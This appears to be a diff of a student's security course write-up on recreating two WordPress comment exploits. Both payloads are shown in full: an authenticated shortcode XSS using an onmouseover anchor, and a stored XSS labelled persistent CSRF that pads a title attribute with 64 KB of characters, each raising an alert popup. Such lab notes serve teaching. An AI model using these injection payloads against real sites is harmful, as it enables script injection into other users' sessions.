@@ -1,4 +1,5 @@
 # CyberSec_Week7
+# Victor Hong 
 
 ## XSS Exploit
 The XSS exploit that I used in the project is the __Authenticated Shortcode Tags XSS__. This XSS exploit was tested in version 4.2 and fixed in version 4.7.2. 
@@ -9,7 +10,9 @@ The XSS exploit that I used in the project is the __Authenticated Shortcode Tags
 ### To recreate
 1. As an admin, post a comment containing
 
-`<a href = "XSS" onmouseover=alert(1) rel="nofollow">CLICK ME!</a>`
+```
+<a href = "XSS" onmouseover=alert(1) rel="nofollow">CLICK ME!</a>
+```
 
 2. Once it's posted, hover over the link in the comment.
 
@@ -22,7 +25,9 @@ The CSRF exploit that I used in the project is the __Persistent CSRF__. This CSR
 ### To recreate
 1. As a user, post a comment containing
 
-`<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>`
+```
+<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>
+```
 
 2. Replace the [64 kb] with 64kbs of As. (70kbs) used in example.
 3. Approve the comment as admin and a popup will appear. 
